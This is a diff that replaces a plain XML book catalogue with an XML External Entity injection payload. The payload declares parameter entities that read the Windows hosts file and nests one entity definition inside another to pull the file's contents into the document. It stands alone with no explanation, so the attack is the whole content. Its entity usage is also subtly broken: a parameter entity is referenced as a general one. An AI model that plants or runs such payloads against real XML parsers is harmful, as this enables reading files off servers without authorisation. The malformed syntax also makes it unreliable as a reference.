@@ -1,24 +1,10 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<library>
-  <book>
-    <id>101</id>
-    <title>To Kill a Mockingbird</title>
-    <author>Harper Lee</author>
-    <genre>Fiction</genre>
-    <published>1960</published>
-  </book>
-  <book>
-    <id>102</id>
-    <title>1984</title>
-    <author>George Orwell</author>
-    <genre>Dystopian</genre>
-    <published>1949</published>
-  </book>
-  <book>
-    <id>103</id>
-    <title>The Great Gatsby</title>
-    <author>F. Scott Fitzgerald</author>
-    <genre>Classic</genre>
-    <published>1925</published>
-  </book>
-</library>
+<!DOCTYPE data [
+    <!ENTITY % file SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///C:/Windows/System32/drivers/etc/hosts'>">
+    %eval;
+    %exfil;
+]>
+<data>
+    <content>&file;</content>
+</data>
